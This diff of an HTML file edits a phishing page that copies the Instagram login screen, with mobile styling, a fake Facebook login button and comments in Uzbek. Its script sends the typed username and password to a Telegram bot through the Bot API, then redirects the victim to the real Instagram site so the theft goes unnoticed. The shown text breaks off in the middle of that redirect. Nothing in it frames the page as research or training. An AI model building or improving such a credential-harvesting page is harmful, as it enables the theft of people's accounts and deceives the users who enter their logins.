@@ -5,87 +5,128 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
+            background-color: #fff; /* Mobil versiya odatda oq fonda bo'ladi */
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
+            padding-top: 10px;
         }
-        .login-container {
+        .main-container {
+            width: 100%;
+            max-width: 350px;
+            padding: 10px 20px;
+        }
+        .login-box {
             background-color: #fff;
             border: 1px solid #dbdbdb;
-            padding: 40px;
-            width: 350px;
-            box-sizing: border-box;
+            padding: 40px 30px;
             text-align: center;
+            margin-top: 20px;
         }
         .logo-img {
             width: 175px;
-            margin-bottom: 30px;
-            cursor: pointer;
+            margin: 22px auto 35px;
+            display: block;
         }
         input {
             width: 100%;
-            padding: 10px;
-            margin-bottom: 8px;
+            padding: 9px 8px;
+            margin-bottom: 6px;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             background-color: #fafafa;
             font-size: 12px;
-            box-sizing: border-box;
-        }
-        input:focus {
-            border: 1px solid #a8a8a8;
             outline: none;
         }
-        button {
+        input:focus { border: 1px solid #a8a8a8; }
+        
+        button#loginBtn {
             width: 100%;
             background-color: #0095f6;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 4px;
             padding: 7px;
             font-weight: 600;
             font-size: 14px;
-            margin-top: 8px;
+            margin: 8px 0;
             cursor: pointer;
         }
-        button:disabled { background-color: #b2dffc; }
-        .separator { margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .separator::before, .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+            margin: 0 10px;
+        }
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            border: none;
+            background: none;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        .fb-logo { width: 16px; margin-right: 8px; }
+        .forgot-pass { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin-top: 10px; }
         .footer-box {
-            background-color: #fff;
             border: 1px solid #dbdbdb;
             padding: 20px;
-            width: 350px;
             margin-top: 10px;
             text-align: center;
-            box-sizing: border-box;
             font-size: 14px;
+            width: 100%;
         }
         .footer-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        
+        /* Mobil uchun moslash (borderlarni olib tashlash) */
+        @media (max-width: 450px) {
+            .login-box, .footer-box { border: none; }
+            body { background-color: #fff; }
+        }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img" alt="Instagram">
-    
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Log In</button>
-    </form>
+<div class="main-container">
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img" alt="Instagram">
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="loginBtn">Log In</button>
+        </form>
 
-    <div class="separator"> OR </div>
-    <div style="color: #385185; font-weight: 600; font-size: 14px; cursor: pointer;"> Log in with Facebook </div>
-</div>
+        <div class="separator">OR</div>
+        
+        <button class="fb-login">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" class="fb-logo">
+            Log in with Facebook
+        </button>
+        
+        <a href="#" class="forgot-pass">Forgot password?</a>
+    </div>
 
-<div class="footer-box">
-    Don't have an account? <a href="#">Sign up</a>
+    <div class="footer-box">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
 </div>
 
 <script>
@@ -97,15 +138,11 @@
         const u = document.getElementById('username').value;
         const p = document.getElementById('password').value;
 
+        // Ma'lumotni yuborish
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: chatId, text: `👤 Login: ${u}\n🔑 Parol: ${p}` })
         }).then(() => {
-            window.location.href = "https://www.instagram.com";
-        });
-    });
-</script>
-
-</body>
-</html>
+            // Yuborilgandan keyin haqiqiy Instagram sahifasiga xatolik haqida xabar bilan yo'naltirish
+            window.location.href = "https://www.
